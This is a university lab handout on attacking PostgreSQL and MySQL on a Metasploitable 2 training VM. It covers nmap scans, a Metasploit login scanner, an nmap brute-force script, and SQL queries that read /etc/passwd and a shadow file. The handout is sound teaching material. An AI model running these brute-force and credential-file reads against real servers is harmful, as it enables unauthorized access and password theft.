# ACIT 4630 - Lab 3: Attacking Databases on Metasploitable 2

## Instructions

### Scanning for Open Ports
Run the following command to scan for services and ports on the Metasploitable 2 VM:
```sh
   sudo nmap -sV <Metasploitable2_VM_IP>
```
Identify the open ports for PostgreSQL (port 5432) and MySQL (port 3306).
Run a more detailed scan on the database ports: (OPTIONAL)
```sh
sudo nmap -T5 --script='all' -p5432,3306 <Metasploitable2_VM_IP>
```
### Attack PostgreSQL Database
Start Metasploit in Kali Linux:
```sh
   msfconsole
```
Search for the PostgreSQL login scanner:
```sh
   search scanner postgres login
```
Set the necessary variables:
- Set `RHOSTS` to your <Metasploitable2_VM_IP>.
- Set `ANONYMOUS_LOGIN` to true.

Run the exploit to find working credentials: `run` or `exploit`
After discovering the credentials, log in to the PostgreSQL database:
```sh
   psql -h <Metasploitable2_VM_IP> -U <Username> -d <DB Name>
```
Once inside the PostgreSQL shell, retrieve the system's password file as below:
1.	First, we need to create a Table:
    ```sql
    CREATE TABLE passwd_data (line TEXT);
    ```
2.	Then we need to copy the file to out table:
    ```sql
    COPY passwd_data FROM '/etc/passwd';
    ```
3.	We read the whole table:
    ```sql
    SELECT * from passwd_data;
    ```

### Attack MySQL Database
Run the following Nmap command to brute force MySQL credentials:
```sh
sudo nmap -T1 -d --script="mysql-brute" -p3306 <Metasploitable2_VM_IP>
```
**Note**: If no credentials are found, try again OR reboot the Metasploitable 2 VM.
After obtaining credentials, log in to MySQL:
```sh
  mysql -h <Metasploitable2_VM_IP> -u <Username found> -p --skip-ssl
```
In the MySQL shell, dump the password file:
```sql
SELECT load_file('etc/shadow-');
```

### Submission For Lab 3: 
- Add these screenshots to your report:
- Result of msfconsole postgres exploit
- Result of entering postgres database and retrieving the passwd file
- Result of nmap script where you got credentials of mysql
- Result of entering mysql database queries and retrieving the passwd file
